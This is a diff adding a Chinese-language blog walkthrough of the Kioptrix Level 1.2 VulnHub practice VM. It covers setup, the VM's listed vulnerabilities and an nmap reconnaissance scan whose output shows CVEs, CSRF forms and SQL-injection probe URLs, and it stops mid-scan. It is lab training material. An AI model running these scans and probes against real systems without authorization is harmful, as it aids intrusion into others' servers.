@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="名称：Kioptrix: Level 1.2 (#3)发行日期：2011年4月18日 下载：  Download: http:&#x2F;&#x2F;www.kioptrix.com&#x2F;dlvm&#x2F;KVM3.rar Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;kioptrix&#x2F;KVM3.rar Download (Torrent): https:&#x2F;&#x2F;download.v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机渗透[KVM3]">
+<meta property="og:url" content="https://fdlucifer.github.io/2019/12/13/KVM3/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="名称：Kioptrix: Level 1.2 (#3)发行日期：2011年4月18日 下载：  Download: http:&#x2F;&#x2F;www.kioptrix.com&#x2F;dlvm&#x2F;KVM3.rar Download (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;kioptrix&#x2F;KVM3.rar Download (Torrent): https:&#x2F;&#x2F;download.v">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub50.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub51.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub52.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub53.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub54.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub55.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg">
+<meta property="article:published_time" content="2019-12-13T08:18:39.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:53:38.152Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub49.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2019/12/13/KVM3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2019/12/13/KVM3/","path":"2019/12/13/KVM3/","title":"vulnhub靶机渗透[KVM3]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub靶机渗透[KVM3] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">更多方法</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2019/12/13/KVM3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub靶机渗透[KVM3] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机渗透[KVM3]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2019-12-13 16:18:39" itemprop="dateCreated datePublished" datetime="2019-12-13T16:18:39+08:00">2019-12-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:53:38" itemprop="dateModified" datetime="2020-08-17T00:53:38+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>名称：Kioptrix: Level 1.2 (#3)<br>发行日期：2011年4月18日</p>
+<p>下载：</p>
+<ul>
+<li>Download: <span class="exturl" data-url="aHR0cDovL3d3dy5raW9wdHJpeC5jb20vZGx2bS9LVk0zLnJhcg==">http://www.kioptrix.com/dlvm/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhcg==">https://download.vulnhub.com/kioptrix/KVM3.rar<i class="fa fa-external-link-alt"></i></span></li>
+<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9raW9wdHJpeC9LVk0zLnJhci50b3JyZW50">https://download.vulnhub.com/kioptrix/KVM3.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>描述：</p>
+<p>自上次Kioptrix VM挑战以来已经过去了一段时间。生活不断让您知道这些事情。<br>在看到最后两个的下载数量之后，以及无数的视频中展示了克服这些挑战的方法。我觉得需要1.2（或者只是3级）。感谢您下载并播放了前两个版本。还要感谢那些花时间为他们制作视频解决方案的人。不胜感激。<br>与其他两个一样，这一挑战也面向初学者。但是，这是不同的。增加了一些步骤，并且需要新的技能。我仍然必须成为初学者的领域。与其他方法一样，“pown”此方法的方法不止一种。很简单，而不是那么简单。记住……“轻松”或“困难”的感觉总是与自己的技能水平相关的。我从未说过这些事情异常困难或困难，但我们都需要从某个地方入手。让我告诉你，制作这些易受攻击的VM并不像看起来那么容易…<br>这个挑战很重要。一旦找到IP（DHCP客户端），请编辑主机文件并将其指向kioptrix3.com。<br>在Windows下，您可以编辑C：\Windows\System32\drivers\etc\hosts，如下所示：</p>
+<span id="more"></span>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#   127.0.0.1 localhost</span></span><br><span class="line"><span class="comment">#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</span></span><br><span class="line">192.168.1.102 kioptrix3.com</span><br></pre></td></tr></table></figure>
+<p>在Linux下，将是&#x2F;etc&#x2F;hosts<br>这里涉及一个网络应用程序，因此要使所有内容都很好并正确显示，您确实需要这样做。<br>希望您喜欢Kioptrix VM Level 1.2挑战。<br>Have fun</p>
+<p>漏洞：</p>
+<ul>
+<li>文件包含</li>
+<li>访问控制不当</li>
+<li>重用凭证</li>
+<li>SQL注入</li>
+<li>不受限制地上传危险类型的文件</li>
+<li>凭证不足</li>
+</ul>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.84.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.144</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">MAC Address: 00:0C:29:44:36:85 (VMware)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.84.144</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">|_clamav-<span class="built_in">exec</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.7p1: </span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=<span class="number">3</span>; maxpagecount=<span class="number">20</span>; withinhost=<span class="number">192.168</span>.<span class="number">84.144</span></span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/gallery/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?system=Admin</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/gallery/index.php</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: login.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/gallery/gadmin/</span><br><span class="line">|     Form id: username</span><br><span class="line">|     Form action: index.php?task=signin</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     Form id: contactform</span><br><span class="line">|     Form action: index.php?system=Admin&amp;page=loginSubmit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?system=Blog&amp;post=<span class="number">1281005380</span></span><br><span class="line">|     Form id: commentform</span><br><span class="line">|_    Form action: </span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|   /cache/: Potentially interesting folder</span><br><span class="line">|   /core/: Potentially interesting folder</span><br><span class="line">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">|   /modules/: Potentially interesting directory w/ listing on &#x27;apache/<span class="number">2.2</span>.<span class="number">8</span> (ubuntu) php/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with suhosin-patch&#x27;</span><br><span class="line">|_  /style/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span>.<span class="number">8</span> (Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">6</span> with Suhosin-Patch</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: <span class="number">2009</span>-<span class="number">09</span>-<span class="number">17</span></span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-<span class="number">2007</span>-<span class="number">6750</span></span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?system=Admin&amp;page=loginSubmit%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?system=Admin&amp;page=loginSubmit%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|     http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|_    http://<span class="number">192.168</span>.<span class="number">84.144</span>:<span class="number">80</span>/index.php?page=index%<span class="number">27</span>%<span class="number">20</span>OR%<span class="number">20</span>sqlspider</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-vuln-cve2017-<span class="number">1001000</span>: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:apache:http_server:<span class="number">2.2</span>.<span class="number">8</span>: </span><br><span class="line">|       CVE-<span class="number">2010</span>-<span class="number">0425</span>   <span class="number">10.0</span>    https://vulners.com/cve/CVE-<span class="number">2010</span>-<span class="number">0425</span></span><br><span class="line">|       CVE-<span class="number">2011</span>-<span class="number">3192</span>   <span class="number">7.8</span>     https://vulners.com/cve/CVE-<span class="number">2011</span>-<span class="number">3192</span></span><br><span class="line">|       CVE-<span class="number">2017</span>-<span class="number">7679</span>   <span class="number">7.5</span>     https://vulners.com/cve/CVE-<span class="number">2017</span>-<span class="number">7679</span></span><br><span class="line">|       CVE-<span class="number">2013</span>-<span class="number">2249</span>   <span class="number">7.5</span>     https://vulners.com/cve/CVE-<span class="number">2013</span>-<span class="number">2249</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1891</span>   <span class="number">7.1</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1891</span></span><br><span class="line">|       CVE-<span class="number">2009</span>-<span class="number">1890</span>   <span class="number">7.1</span>     https://vulners.com/cve/CVE-<span class="number">2009</span>-<span class="number">1890</span></span><br><span class="line">|       CVE-<span class="number">2012</span>-<span 